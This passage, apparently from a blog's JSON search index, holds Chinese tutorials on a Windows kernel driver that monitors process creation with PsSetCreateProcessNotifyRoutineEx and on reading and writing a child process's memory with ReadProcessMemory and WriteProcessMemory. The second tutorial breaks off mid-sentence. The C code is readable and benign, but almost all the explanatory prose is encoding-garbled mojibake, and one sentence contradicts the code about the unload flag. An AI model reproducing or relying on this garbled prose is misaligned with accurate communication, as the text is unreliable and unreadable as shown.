¸æä¾›çš„äº‹ä»¶é€šçŸ¥æœºåˆ¶ï¼Œå¯ä»¥å¯¹ç³»ç»Ÿå†…æŸä¸€ç±»äº‹ä»¶çš„æ“ä½œè¿›è¡Œç›‘æ§ã€‚æ¯”å¦‚ï¼Œå¯ä»¥é€šè¿‡PsSetCreateProcessNotifyRoutineExå‡½æ•°æ³¨å†Œä¸€ä¸ªåˆ›å»ºè¿›ç¨‹çš„é€šçŸ¥ï¼Œä»è€Œå®ç°å¯¹è¿›ç¨‹åˆ›å»ºçš„ç›‘æ§ã€‚ æœ¬æ–‡ä¸»è¦å‚è€ƒã€ŠWindowså†…æ ¸ç¼–ç¨‹ã€‹ç¬¬21ç« ã€‚ PsSetCreateProcessNotifyRoutineExçš„ç”¨æ³•PsSetCreateProcessNotifyRoutineExçš„å‡½æ•°åŸå‹ä¸ºï¼š 1234NTSTATUS PsSetCreateProcessNotifyRoutineEx( PCREATE_PROCESS_NOTIFY_ROUTINE_EX NotifyRoutine, BOOLEAN Remove); å…¶ä¸­NotifyRoutineä¸ºä¸€ä¸ªå‡½æ•°æŒ‡é’ˆï¼Œè¿™ä¸ªå‡½æ•°çš„åŸå‹è¢«è§„å®šä¸ºï¼š 12345678PCREATE_PROCESS_NOTIFY_ROUTINE_EX PcreateProcessNotifyRoutineEx;void PcreateProcessNotifyRoutineEx( PEPROCESS Process, HANDLE ProcessId, PPS_CREATE_NOTIFY_INFO CreateInfo){...} è¿™ä¸ªå‡½æ•°è¢«ç§°ä¸ºé€šçŸ¥ä¾‹ç¨‹ï¼Œåªè¦å‘ç”Ÿäº†â€œè¿›ç¨‹åˆ›å»ºæˆ–é”€æ¯â€è¿™ä¸€äº‹ä»¶ï¼Œè¿™ä¸ªPcreateProcessNotifyRoutineExå°±ä¼šè¢«è°ƒç”¨ä¸€æ¬¡ï¼Œè¿™æ ·å°±å®ç°äº†å¯¹è¿›ç¨‹åˆ›å»ºçš„ç›‘æ§ã€‚ å¦ä¸€ä¸ªå‚æ•°ä¸ºRemoveï¼ŒRemoveä¸ºFALSEæ—¶ï¼Œè¡¨ç¤ºè¦è¿›è¡Œæ³¨å†Œä¸€ä¸ªé€šçŸ¥ï¼›Removeä¸ºTRUEï¼Œè¡¨ç¤ºè¦ç§»é™¤è¿™ä¸ªé€šçŸ¥ã€‚å› æ­¤ï¼Œä¸€èˆ¬ä¼šåœ¨DriverEntryï¼Œå³é©±åŠ¨çš„å…¥å£å‡½æ•°ä¸­è°ƒç”¨PsSetCreateProcessNotifyRoutineExæ—¶å°†Removeè®¾ç½®ä¸ºFALSEï¼›åœ¨DriverUnloadï¼Œå³é©±åŠ¨çš„å¸è½½å‡½æ•°ä¸­å†è°ƒç”¨ä¸€æ¬¡PsSetCreateProcessNotifyRoutineExï¼Œæ­¤æ—¶éœ€è¦å°†Removeè®¾ç½®ä¸ºFALSEã€‚ é€šçŸ¥ä¾‹ç¨‹å‡½æ•°çš„å‚æ•°è¯´æ˜é€šçŸ¥ä¾‹ç¨‹å‡½æ•°æœ‰ä¸‰ä¸ªå½¢å‚ï¼Œé€šè¿‡è¿™ä¸‰ä¸ªå½¢å‚ï¼Œå°±å¯ä»¥çŸ¥é“è¦åˆ›å»ºï¼ˆæˆ–é”€æ¯ï¼‰çš„è¿›ç¨‹çš„ä¸€äº›åŸºæœ¬ä¿¡æ¯ã€‚ ProcessIdä¸ºè¦åˆ›å»ºçš„è¿›ç¨‹å¯¹åº”çš„è¿›ç¨‹IDã€‚ æ ¹æ®CreateInfoå¯ä»¥åˆ¤æ–­å½“å‰è¿›è¡Œçš„æ˜¯è¿›ç¨‹çš„åˆ›å»ºè¿˜æ˜¯é”€æ¯æ“ä½œã€‚å¦‚æœè¦è¿›è¡Œè¿›ç¨‹é”€æ¯æ“ä½œï¼Œåˆ™CreateInfoçš„å€¼ä¼šæ˜¯NULLã€‚å› æ­¤ï¼Œé€šè¿‡åˆ¤æ–­CreateInfoæ˜¯å¦ä¸ºNULLï¼Œå¯ä»¥å¾—çŸ¥è¦è¿›è¡Œçš„æ“ä½œæ˜¯è¿›ç¨‹åˆ›å»ºè¿˜æ˜¯è¿›ç¨‹é”€æ¯ã€‚ è¿›è¡Œè¿›ç¨‹åˆ›å»ºæ“ä½œæ—¶ï¼ŒCreateInfoçš„ç»“æ„ä½“å®šä¹‰ä¸ºï¼š 1234567891011121314151617typedef struct _PS_CREATE_NOTIFY_INFO { SIZE_T Size; union { ULONG Flags; struct { ULONG FileOpenNameAvailable : 1; ULONG IsSubsystemProcess : 1; ULONG Reserved : 30; }; }; HANDLE ParentProcessId; CLIENT_ID CreatingThreadId; struct _FILE_OBJECT *FileObject; PCUNICODE_STRING ImageFileName; PCUNICODE_STRING CommandLine; NTSTATUS CreationStatus;} PS_CREATE_NOTIFY_INFO, *PPS_CREATE_NOTIFY_INFO; ä»ä¸­å¯ä»¥å¾—åˆ°è¿›ç¨‹çš„åå­—ã€å‚æ•°ã€çˆ¶è¿›ç¨‹IDç­‰ä¿¡æ¯ã€‚ è¿›ç¨‹ç›‘æ§é©±åŠ¨ç¨‹åºç¼–å†™å‡½æ•°å’Œå…¨å±€å˜é‡å£°æ˜åœ¨ç¨‹åºçš„æœ€å¼€å§‹å…ˆå£°æ˜å‡ ä¸ªéœ€è¦ç”¨åˆ°çš„å‡½æ•°å’Œå…¨å±€å˜é‡ï¼š 1234567#include &lt;ntddk.h&gt;/*å‡½æ•°åŸå‹å£°æ˜*/VOID DriverUnload(__in struct _DRIVER_OBJECT* DriverObject); //é©±åŠ¨å¸è½½å‡½æ•°VOID ProcessNotify(__inout PEPROCESS Process, __in HANDLE ProcessId, __in_opt PPS_CREATE_NOTIFY_INFO CreateInfo); //é€šçŸ¥ä¾‹ç¨‹BOOLEAN g_bSuccRegister = FALSE; //ç”¨äºè®°å½•æ˜¯å¦æˆåŠŸæ³¨å†Œé€šçŸ¥ä¾‹ç¨‹ DriverEntry12345678910111213NTSTATUS DriverEntry(__in struct _DRIVER_OBJECT* DriverObject, __in PUNICODE_STRING RegistryPath) { UNREFERENCED_PARAMETER(RegistryPath); NTSTATUS nStatus = STATUS_UNSUCCESSFUL; do { DriverObject-&gt;DriverUnload = DriverUnload; if (STATUS_SUCCESS != PsSetCreateProcessNotifyRoutineEx(ProcessNotify, FALSE)) { break; } g_bSuccRegister = TRUE; nStatus = STATUS_SUCCESS; } while (FALSE); return nStatus;} DriverEntryçš„ä¸»è¦åŠŸèƒ½æ˜¯è°ƒç”¨PsSetCreateProcessNotifyRoutineExï¼Œå°†ProcessNotifyå‡½æ•°æ³¨å†Œä¸ºè¿›ç¨‹åˆ›å»ºçš„é€šçŸ¥ä¾‹ç¨‹ã€‚ DriverUnload1234567VOID DriverUnload(__in struct _DRIVER_OBJECT* DriverObject) { UNREFERENCED_PARAMETER(DriverObject); if (g_bSuccRegister) { PsSetCreateProcessNotifyRoutineEx(ProcessNotify, TRUE); } return;} åœ¨å¸è½½é©±åŠ¨æ¨¡å—æ—¶ï¼Œéœ€è¦å†è°ƒç”¨ä¸€æ¬¡PsSetCreateProcessNotifyRoutineExï¼Œå°†ä¹‹å‰æ³¨å†Œçš„äº‹ä»¶é€šçŸ¥ç§»é™¤ã€‚ ProcessNotifyè¿™ä¸€å‡½æ•°ä¸ºè¿›ç¨‹åˆ›å»ºæˆ–é”€æ¯çš„é€šçŸ¥ä¾‹ç¨‹ï¼Œæ¯å½“å‘ç”Ÿè¿›ç¨‹åˆ›å»ºæˆ–è¿›ç¨‹é”€æ¯æ—¶ï¼Œè¿™ä¸€å‡½æ•°éƒ½ä¼šè¢«è°ƒç”¨ï¼Œå†…å®¹ä¸ºï¼š 1234567891011VOID ProcessNotify(__inout PEPROCESS Process, __in HANDLE ProcessId, __in_opt PPS_CREATE_NOTIFY_INFO CreateInfo) { UNREFERENCED_PARAMETER(Process); if (NULL == CreateInfo) { //è¿›ç¨‹ç»“æŸ DbgPrint(&quot;[Destroy] [PID = 0x%x] [CurrentPID = 0x%x]\\n&quot;, ProcessId, PsGetCurrentProcessId()); return; } //è¿›ç¨‹åˆ›å»º DbgPrint(&quot;[Create] [PID = 0x%x, Name=%wZ] [CurrentPID = 0x%x] [PPID = 0x%x]\\n&quot;, ProcessId, CreateInfo-&gt;ImageFileName, PsGetCurrentProcessId(), CreateInfo-&gt;ParentProcessId); return;} å‡½æ•°ä¼šæ‰“å°å’Œè¿›ç¨‹æœ‰å…³çš„ä¸€äº›ä¿¡æ¯ã€‚ å®Œæ•´ä»£ç 1234567891011121314151617181920212223242526272829303132333435363738394041#include &lt;ntddk.h&gt;/*å‡½æ•°åŸå‹å£°æ˜*/VOID DriverUnload(__in struct _DRIVER_OBJECT* DriverObject); //é©±åŠ¨å¸è½½å‡½æ•°VOID ProcessNotify(__inout PEPROCESS Process, __in HANDLE ProcessId, __in_opt PPS_CREATE_NOTIFY_INFO CreateInfo); //é€šçŸ¥ä¾‹ç¨‹BOOLEAN g_bSuccRegister = FALSE; //ç”¨äºè®°å½•æ˜¯å¦æˆåŠŸæ³¨å†Œé€šçŸ¥ä¾‹ç¨‹NTSTATUS DriverEntry(__in struct _DRIVER_OBJECT* DriverObject, __in PUNICODE_STRING RegistryPath) { UNREFERENCED_PARAMETER(RegistryPath); NTSTATUS nStatus = STATUS_UNSUCCESSFUL; do { DriverObject-&gt;DriverUnload = DriverUnload; if (STATUS_SUCCESS != PsSetCreateProcessNotifyRoutineEx(ProcessNotify, FALSE)) { break; } g_bSuccRegister = TRUE; nStatus = STATUS_SUCCESS; } while (FALSE); return nStatus;}VOID DriverUnload(__in struct _DRIVER_OBJECT* DriverObject) { UNREFERENCED_PARAMETER(DriverObject); if (g_bSuccRegister) { PsSetCreateProcessNotifyRoutineEx(ProcessNotify, TRUE); } return;}VOID ProcessNotify(__inout PEPROCESS Process, __in HANDLE ProcessId, __in_opt PPS_CREATE_NOTIFY_INFO CreateInfo) { UNREFERENCED_PARAMETER(Process); if (NULL == CreateInfo) { //è¿›ç¨‹ç»“æŸ DbgPrint(&quot;[Destroy] [PID = 0x%x] [CurrentPID = 0x%x]\\n&quot;, ProcessId, PsGetCurrentProcessId()); return; } //è¿›ç¨‹åˆ›å»º DbgPrint(&quot;[Create] [PID = 0x%x, Name=%wZ] [CurrentPID = 0x%x] [PPID = 0x%x]\\n&quot;, ProcessId, CreateInfo-&gt;ImageFileName, PsGetCurrentProcessId(), CreateInfo-&gt;ParentProcessId); return;} ç¼–è¯‘æ—¶éœ€è¦åŠ ä¸Š/INTEGRITYCHECKä½¿ç”¨Visual Studioå¯¹é©±åŠ¨è¿›è¡Œç¼–è¯‘æ—¶ï¼Œéœ€è¦åŠ ä¸Š/INTEGRITYCHECKé€‰é¡¹ï¼Œå¦åˆ™PsSetCreateProcessNotifyRoutineExä¼šè¿”å›STATUS_ACCESS_DENIEDé”™è¯¯ç ã€‚ è¿è¡Œç»“æœåœ¨è™šæ‹Ÿæœºä¸­ç¦ç”¨é©±åŠ¨ç¨‹åºå¼ºåˆ¶ç­¾åï¼Œç„¶åè¿è¡Œé©±åŠ¨ï¼Œæ‰“å¼€DbgViewæŸ¥çœ‹æ‰“å°çš„ç»“æœï¼š ä¸Šå›¾ä¸ºéƒ¨åˆ†æ‰“å°ç»“æœï¼Œé©±åŠ¨æˆåŠŸç›‘æµ‹åˆ°notepadè¿›ç¨‹çš„åˆ›å»ºå’Œé”€æ¯ã€‚ é€šçŸ¥ä¾‹ç¨‹çš„ä¸Šä¸‹æ–‡åœ¨åˆ›å»ºå’Œé”€æ¯è¿›ç¨‹æ—¶ï¼Œé€šçŸ¥ä¾‹ç¨‹éƒ½ä¼šè¢«è°ƒç”¨ï¼Œé‚£ä¹ˆé€šçŸ¥ä¾‹ç¨‹æ˜¯åœ¨å“ªä¸ªè¿›ç¨‹ä¸­è¢«è°ƒç”¨çš„å‘¢ï¼Ÿæ ¹æ®ã€ŠWindowså†…æ ¸ç¼–ç¨‹ã€‹çš„è¯´æ³•ï¼š å¯¹äºè¿›ç¨‹åˆ›å»ºé€šçŸ¥æ¥è¯´ï¼Œé€šçŸ¥ä¾‹ç¨‹è¿è¡Œåœ¨åˆ›å»ºè¯¥è¿›ç¨‹çš„çº¿ç¨‹ä¸Šä¸‹æ–‡ä¸­ï¼Œå¦‚æœçº¿ç¨‹Aè°ƒç”¨åº”ç”¨å±‚CreateProcesså‡½æ•°åˆ›å»ºå­è¿›ç¨‹Bï¼Œé‚£ä¹ˆé€šçŸ¥ä¾‹ç¨‹å°±è¿è¡Œåœ¨Açº¿ç¨‹çš„ä¸Šä¸‹æ–‡ä¸­ã€‚å¯¹äºè¿›ç¨‹ç»“æŸé€šçŸ¥æ¥è¯´ï¼Œé€šçŸ¥ä¾‹ç¨‹è¿è¡Œåœ¨è¯¥è¿›ç¨‹ä¸­æœ€åä¸€ä¸ªé€€å‡ºçš„çº¿ç¨‹çš„ä¸Šä¸‹æ–‡ä¸­ï¼ˆä¸€èˆ¬æ˜¯ä¸»çº¿ç¨‹ï¼‰ã€‚ æ ¹æ®ä¸Šé¢çš„è¿è¡Œç»“æœä¹Ÿå¯ä»¥çœ‹å‡ºï¼Œå½“è¿›ç¨‹åˆ›å»ºæ—¶ï¼Œè°ƒç”¨PsGetCurrentProcessIdå¾—åˆ°çš„è¿›ç¨‹IDï¼ˆCurrentPIDï¼‰æ˜¯å’Œçˆ¶è¿›ç¨‹çš„IDç›¸åŒçš„ï¼›è€Œå½“è¿›ç¨‹ç»“æŸæ—¶ï¼ŒPsGetCurrentProcessIdå¾—åˆ°çš„è¿›ç¨‹IDæ˜¯å’Œè¦é”€æ¯çš„è¿›ç¨‹IDç›¸åŒçš„ã€‚ä¸è¿‡ä¹Ÿæœ‰è¿›ç¨‹åˆ›å»ºæ—¶ï¼ŒCurrentPIDå’ŒPPIDä¸ç›¸ç­‰çš„æƒ…å†µã€‚ è¿›ç¨‹æ˜¯32ä½è¿˜æ˜¯64ä½åœ¨å†…æ ¸é©±åŠ¨ä¸­ï¼Œè¦æƒ³çŸ¥é“è¿›ç¨‹æ˜¯32ä½è¿˜æ˜¯64ä½ï¼Œå¯ä»¥ä½¿ç”¨ZwQueryInformationProcesså‡½æ•°ï¼Œä½†è¿™ä¸ªå‡½æ•°éœ€è¦ä¼ å…¥è¿›ç¨‹çš„å¥æŸ„ï¼Œæ‰€ä»¥åœ¨è¿™ä¹‹å‰è¦å…ˆæƒ³åŠæ³•è·å–è¿›ç¨‹çš„å¥æŸ„ã€‚ç°åœ¨å·²ç»æœ‰äº†æŒ‡å‘è¿›ç¨‹å¯¹è±¡çš„æŒ‡é’ˆï¼Œç±»å‹ä¸ºPEPROCESSï¼Œå˜é‡åä¸ºProcessï¼Œå› æ­¤å¯ä»¥ä½¿ç”¨ObOpenObjectByPointerå¾—åˆ°è¿™ä¸ªè¿›ç¨‹å¯¹è±¡çš„ä¸€ä¸ªå¥æŸ„ï¼š 12345status = ObOpenObjectByPointer(Process, OBJ_KERNEL_HANDLE, NULL, 0, NULL, KernelMode, &amp;hProcess); //è·å–è¿›ç¨‹å¥æŸ„if (STATUS_SUCCESS != status) { DbgPrint(&quot;ObOpenObjectByPointer Failed:0x%x&quot;, status); break;} æ¥ä¸‹æ¥ä½¿ç”¨ZwQueryInformationProcessï¼Œä½†å‘ç°å¤´æ–‡ä»¶ä¸­å¹¶æ²¡æœ‰è¿™ä¸ªå‡½æ•°ï¼Œå› æ­¤è¦ä½¿ç”¨MmGetSystemRoutineAddressæ‰¾åˆ°è¿™ä¸ªå‡½æ•°ã€‚é¦–å…ˆåœ¨æ–‡ä»¶å¼€å¤´å®šä¹‰å…¨å±€å˜é‡å­˜å‚¨ZwQueryInformationProcessçš„åœ°å€ï¼š 12345678typedef NTSTATUS(*ZWQUERYINFORMATIONPROCESS) ( __in HANDLE ProcessHandle, __in PROCESSINFOCLASS ProcessInformationClass, __out_bcount(ProcessInformationLength) PVOID ProcessInformation, __in ULONG ProcessInformationLength, __out_opt PULONG ReturnLength);ZWQUERYINFORMATIONPROCESS g_pZwQueryInformationProcess = NULL; //ZwQueryInformationProcesså‡½æ•°åœ°å€ åœ¨DriverEntryä¸­æ·»åŠ ä»£ç ï¼Œå¯¹g_pZwQueryInformationProcesså˜é‡èµ‹å€¼ï¼š 1234567UNICODE_STRING uFuncName = { 0 };DriverObject-&gt;DriverUnload = DriverUnload;RtlInitUnicodeString(&amp;uFuncName, L&quot;ZwQueryInformationProcess&quot;);g_pZwQueryInformationProcess = (ZWQUERYINFORMATIONPROCESS)MmGetSystemRoutineAddress(&amp;uFuncName);if (NULL == g_pZwQueryInformationProcess) { break;} æœ€ååœ¨é€šçŸ¥ä¾‹ç¨‹ä¸­æ·»åŠ ä»£ç ï¼Œä½¿ç”¨ZwQueryInformationProcessåˆ¤æ–­å…¶æ˜¯32ä½è¿›ç¨‹è¿˜æ˜¯64ä½è¿›ç¨‹ï¼š 1234567891011status = g_pZwQueryInformationProcess(hProcess, ProcessWow64Information, &amp;isWOW64, sizeof(isWOW64), NULL);if (STATUS_SUCCESS != status) { DbgPrint(&quot;ZwQueryInformationProcess Failed:0x%x&quot;, status); break;}if (isWOW64) { //32ä½è¿›ç¨‹ DbgPrint(&quot;[Detail 0x%x] 32bit&quot;, ProcessId);}else { //64ä½è¿›ç¨‹ DbgPrint(&quot;[Detail 0x%x] 64bit&quot;, ProcessId);} æ·»åŠ äº†ä¸Šé¢è¿™äº›ä»£ç åï¼Œæºä»£ç ä¸ºï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283#include &lt;ntifs.h&gt;#include &lt;ntddk.h&gt;/*å‡½æ•°åŸå‹å£°æ˜*/VOID DriverUnload(__in struct _DRIVER_OBJECT* DriverObject); //é©±åŠ¨å¸è½½å‡½æ•°VOID ProcessNotify(__inout PEPROCESS Process, __in HANDLE ProcessId, __in_opt PPS_CREATE_NOTIFY_INFO CreateInfo); //é€šçŸ¥ä¾‹ç¨‹typedef NTSTATUS(*ZWQUERYINFORMATIONPROCESS) ( __in HANDLE ProcessHandle, __in PROCESSINFOCLASS ProcessInformationClass, __out_bcount(ProcessInformationLength) PVOID ProcessInformation, __in ULONG ProcessInformationLength, __out_opt PULONG ReturnLength);/*å…¨å±€å˜é‡å®šä¹‰*/ZWQUERYINFORMATIONPROCESS g_pZwQueryInformationProcess = NULL; //ZwQueryInformationProcesså‡½æ•°åœ°å€BOOLEAN g_bSuccRegister = FALSE; //ç”¨äºè®°å½•æ˜¯å¦æˆåŠŸæ³¨å†Œé€šçŸ¥ä¾‹ç¨‹NTSTATUS DriverEntry(__in struct _DRIVER_OBJECT* DriverObject, __in PUNICODE_STRING RegistryPath) { UNREFERENCED_PARAMETER(RegistryPath); NTSTATUS nStatus = STATUS_UNSUCCESSFUL; do { UNICODE_STRING uFuncName = { 0 }; DriverObject-&gt;DriverUnload = DriverUnload; RtlInitUnicodeString(&amp;uFuncName, L&quot;ZwQueryInformationProcess&quot;); g_pZwQueryInformationProcess = (ZWQUERYINFORMATIONPROCESS)MmGetSystemRoutineAddress(&amp;uFuncName); if (NULL == g_pZwQueryInformationProcess) { break; } if (STATUS_SUCCESS != PsSetCreateProcessNotifyRoutineEx(ProcessNotify, FALSE)) { break; } g_bSuccRegister = TRUE; nStatus = STATUS_SUCCESS; } while (FALSE); return nStatus;}VOID DriverUnload(__in struct _DRIVER_OBJECT* DriverObject) { UNREFERENCED_PARAMETER(DriverObject); if (g_bSuccRegister) { PsSetCreateProcessNotifyRoutineEx(ProcessNotify, TRUE); } return;}VOID ProcessNotify(__inout PEPROCESS Process, __in HANDLE ProcessId, __in_opt PPS_CREATE_NOTIFY_INFO CreateInfo) { UNREFERENCED_PARAMETER(Process); if (NULL == CreateInfo) { //è¿›ç¨‹ç»“æŸ DbgPrint(&quot;[Destroy] [PID = 0x%x] [CurrentPID = 0x%x]\\n&quot;, ProcessId, PsGetCurrentProcessId()); return; } //è¿›ç¨‹åˆ›å»º DbgPrint(&quot;[Create] [PID = 0x%x, Name=%wZ] [CurrentPID = 0x%x] [PPID = 0x%x]\\n&quot;, ProcessId, CreateInfo-&gt;ImageFileName, PsGetCurrentProcessId(), CreateInfo-&gt;ParentProcessId); HANDLE hProcess = NULL; NTSTATUS status = STATUS_UNSUCCESSFUL; ULONG_PTR isWOW64 = 0; do { status = ObOpenObjectByPointer(Process, OBJ_KERNEL_HANDLE, NULL, 0, NULL, KernelMode, &amp;hProcess); //è·å–è¿›ç¨‹å¥æŸ„ if (STATUS_SUCCESS != status) { DbgPrint(&quot;ObOpenObjectByPointer Failed:0x%x&quot;, status); break; } status = g_pZwQueryInformationProcess(hProcess, ProcessWow64Information, &amp;isWOW64, sizeof(isWOW64), NULL); if (STATUS_SUCCESS != status) { DbgPrint(&quot;ZwQueryInformationProcess Failed:0x%x&quot;, status); break; } if (isWOW64) { //32ä½è¿›ç¨‹ DbgPrint(&quot;[Detail 0x%x] 32bit&quot;, ProcessId); } else { //64ä½è¿›ç¨‹ DbgPrint(&quot;[Detail 0x%x] 64bit&quot;, ProcessId); } } while (FALSE); if (NULL != hProcess) { ZwClose(hProcess); hProcess = NULL; } return;} è¿è¡Œç»“æœå¦‚ä¸‹ï¼š è¯´æ˜é©±åŠ¨ç¨‹åºå¯ä»¥åˆ†è¾¨å‡º32ä½å’Œ64ä½è¿›ç¨‹ã€‚","link":"/2021/04/05/windows-kernel-create-process-notify/"},{"title":"Windowsè¯»å†™å…¶ä»–è¿›ç¨‹å†…å­˜çš„æ–¹æ³•","text":"æœ¬æ–‡è®°å½•äº†å¦‚ä½•ä½¿ç”¨Windowsæä¾›çš„ReadProcessMemoryå’ŒWriteProcessMemoryå¯¹å…¶ä»–è¿›ç¨‹çš„å†…å­˜ç©ºé—´è¿›è¡Œè¯»å†™æ“ä½œã€‚ ReadProcessMemoryå’ŒWriteProcessMemoryçš„å‡½æ•°åŸå‹1234567BOOL ReadProcessMemory( HANDLE hProcess, LPCVOID lpBaseAddress, LPVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesRead); 1234567BOOL WriteProcessMemory( HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten); Microsoftçš„æ–‡æ¡£ä¸­æœ‰å¯¹æ¯ä¸ªå‚æ•°çš„è¯¦ç»†è§£é‡Šï¼š ReadProcessMemory function (memoryapi.h) WriteProcessMemory function (memoryapi.h) ä½¿ç”¨è¿™ä¸¤ä¸ªå‡½æ•°ï¼Œéœ€è¦ä¼ å…¥ç›®æ ‡è¿›ç¨‹çš„å¥æŸ„ã€æƒ³è¦è¯»å†™å†…å­˜çš„åŸºåœ°å€ã€è¯»å†™å†…å­˜çš„å¤§å°ç­‰ä¿¡æ¯ã€‚åœ¨é€šè¿‡CreateProcessåˆ›å»ºå­è¿›ç¨‹æ—¶ï¼Œå¯ä»¥é€šè¿‡PROCESS_INFORMATIONç»“æ„ä½“å¾—åˆ°å­è¿›ç¨‹çš„å¥æŸ„ã€‚å› æ­¤ï¼Œå…ˆæ¥çœ‹è¯»å†™å­è¿›ç¨‹å†…å­˜çš„æ–¹æ³•ã€‚ è¯»å†™å­è¿›ç¨‹å†…å­˜ç¼–å†™å­è¿›ç¨‹å­è¿›ç¨‹çš„åŠŸèƒ½ä¸ºæ‰“å°å…¨å±€å˜é‡içš„å€¼ï¼Œå¹¶ä½¿å˜é‡iä¸æ–­è‡ªå¢ã€‚ 12345678910#include &lt;stdio.h&gt;#include &lt;synchapi.h&gt;int i;int main() { while(1) { printf(&quot;%d. &quot;, i++); Sleep(100); }} è¿è¡Œç»“æœä¸ºï¼š 12&gt; child0. 1. 2. 3. 4. 5. 6. 7. 8. 9. 10. 11. 12. 13. 14. 15. 16. 17. 18. 19. 20. 21. 22. 23. 24. 25. 26. 27. 28. 29. 30. 31. 32. 33. 34. 35. 36. 37. 38. 39. 40. 41. 42. 43. 44. 45. 46. 47. 48. 49. ç¼–å†™çˆ¶è¿›ç¨‹è¯»å–å­è¿›ç¨‹å†…å­˜çˆ¶è¿›ç¨‹é¦–å…ˆè¦é€šè¿‡CreateProcessåˆ›å»ºå­è¿›ç¨‹ï¼Œç„¶åé€šè¿‡PROCESS_INFORMATIONç»“æ„ä½“è·å–å­è¿›ç¨‹çš„å¥æŸ„ã€‚ä¹‹åï¼Œå†å°†å¥æŸ„ä¼ å…¥ReadProcessMemoryï¼Œå³å¯è¯»å–å­è¿›ç¨‹çš„å†…å­˜ã€‚ å¦‚æœè¦è®©çˆ¶è¿›ç¨‹ä¿®æ”¹å­è¿›ç¨‹çš„å…¨å±€å˜é‡iï¼Œåˆ™éœ€è¦çŸ¥é“içš„å†…å­˜åœ°å€ï¼Œè¿™å¯ä»¥é€šè¿‡åæ±‡ç¼–å·¥å…·ï¼ˆå¦‚IDA Proï¼‰è·å–ã€‚æˆ‘ä½¿ç”¨çš„ç¼–è¯‘å™¨ä¼šå°†å…¨å±€å˜é‡içš„å†…å­˜åœ°å€è®¾ç½®ä¸º0x407970ï¼Œä¸åŒç¼–è¯‘å™¨ç¼–è¯‘å¾—åˆ°çš„childä¸­içš„å†…å­˜åœ°å€å¯èƒ½ä¸åŒã€‚ 12345678910111213141516171819202122232425262728293031323334353637#include &lt;processthreadsapi.h&gt;#include &lt;stdio.h&gt;#include &lt;errhandlingapi.h&gt;#include &lt;synchapi.h&gt;#include &lt;handleapi.h&gt;#include &lt;memoryapi.h&gt;int main() { //åˆ›å»ºå­è¿›ç¨‹ STARTUPINFO si = {0}; PROCESS_INFORMATION pi = {0}; si.cb = sizeof(si); BOOL result = CreateProcessA( &quot;child.exe&quot;, //lpApplicationName NULL, //lpCommandLine NULL, NULL, FALSE, 0, NULL, NULL, &amp;si, //lpStartupInfo &amp;pi); //lpProcessInformation if(!result) { printf(&quot;Create Process Failed! Error Code:%d\\n&quot;, GetLastError()); return -1; } //è¯»å†™å­è¿›ç¨‹å…¨å±€å˜é‡iï¼Œåœ°å€ä¸º0x407970 int childi; while(1) { ReadProcessMemory(pi.hProcess, (void *)0x407970, &amp;childi, sizeof(int), NULL); printf(&quot;\\nparent read child i: %d\\n&quot;, childi); Sleep(600); } CloseHandle(pi.hProcess); CloseHandle(pi.hThread); return 0;} è¿è¡Œparentï¼š 12345678910111213&gt; parentparent read child i: 00. 1. 2. 3. 4. 5.parent read child i: 66. 7. 8. 9. 10. 11.parent read child i: 1212. 13. 14. 15. 16. 17.parent read child i: 1818. 19. 20. 21. 22. 23.parent read child i: 2424. 25. 26. 27. 28. 29.parent read child i: 30 å¯ä»¥çœ‹å‡ºparentæˆåŠŸè¯»å–äº†childä¸­å˜é‡içš„å†…å®¹ã€‚ æ·»åŠ ä¿®æ”¹å­è¿›ç¨‹å†…å­˜çš„ä»£ç ä½¿ç”¨WriteProcessMemoryå¯ä»¥ä¿®æ”¹å­è¿›ç¨‹ä¸­içš„å€¼ã€‚åœ¨parentä¸­æ·»åŠ ä»£ç ï¼š 12345678910//è¯»å†™å­è¿›ç¨‹å…¨å±€å˜é‡iï¼Œåœ°å€ä¸º0x407970int childi;while(1) { ReadProcessMemory(pi.hProcess, (void *)0x407970, &amp;childi, sizeof(int), NULL); if(childi &gt; 20) { childi = 0; WriteProcessMemory(pi.hProcess, (void *)0x407970, &amp;childi, sizeof(int), NULL); } Sleep(600);} å½“è¯»å–åˆ°çš„iå¤§äº20æ—¶ï¼Œå°±å°†iæ¸…é›¶ï¼Œå¹¶å†™å…¥å­è¿›ç¨‹çš„å†…å­˜å½“ä¸­ã€‚è¿è¡Œparentï¼š 12345&gt; parent0. 1. 2. 3. 4. 5. 6. 7. 8. 9. 10. 11. 12. 13. 14. 15. 16. 17. 18. 19. 20. 21. 22. 23. 0. 1. 2. 3. 4. 5. 6. 7. 8. 9. 10. 11. 12. 13. 14. 15. 16. 17. 18. 19. 20. 21. 22. 23. 0. 1. 2. 3. 4. 5. 6. 7. 8. 9. 10. 11. 12. 13. 14. 15. 16. 17. 18. 19. 20. 21. 22. 23. 0. 1. 2. 3. 4. 5. 6. 7. 8. 9. 10. 11. 12. 13. 14. 15. 16. 17. 18. 19. 20. 21. 22. 0. 1. 2. 3. 4. 5. 6. iå¤§äº20åä¸ä¹…å°±ä¼šè¢«æ¸…é›¶ã€‚ä¹‹æ‰€ä»¥æ²¡æœ‰ç«‹å³æ¸…é›¶æ˜¯å› ä¸ºparentä¸­æœ‰ä¸€ä¸ªSleep(600);ã€‚ è¯»å–å…¶ä»–è¿›ç¨‹çš„å†…å­˜è¯»å†™å…¶ä»–è¿›ç¨‹å†…å­˜éœ€è¦é¦–å…ˆè·å–å…¶å¥æŸ„ï¼Œè¿™å¯ä»¥é€šè¿‡å‡½æ•°OpenProcesså¾—åˆ°ã€‚ OpenProcesså‡½æ•°åŸå‹12345HANDLE OpenProcess( DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId); å› æ­¤ï¼ŒçŸ¥é“äº†ç›®æ ‡è¿›ç¨‹çš„è¿›ç¨‹æ ‡è¯†ç¬¦ProcessIdï¼Œå°±å¯ä»¥è·å¾—å…¶å¥æŸ„äº†ã€‚ OpenProcess function (processthreadsapi.h) ç¼–å†™ç›®æ ‡è¿›ç¨‹ä»£ç ç›®æ ‡è¿›ç¨‹ä¼šå…ˆè°ƒç”¨GetCurrentProcessIdè·å–è‡ªèº«çš„è¿›ç¨‹æ ‡è¯†ç¬¦å¹¶æ‰“å°å‡ºæ¥ï¼Œç„¶åå°±å¼€å§‹ä¸æ–­æ‰“å°å…¨å±€å˜é‡içš„å€¼å¹¶å°†iåŠ 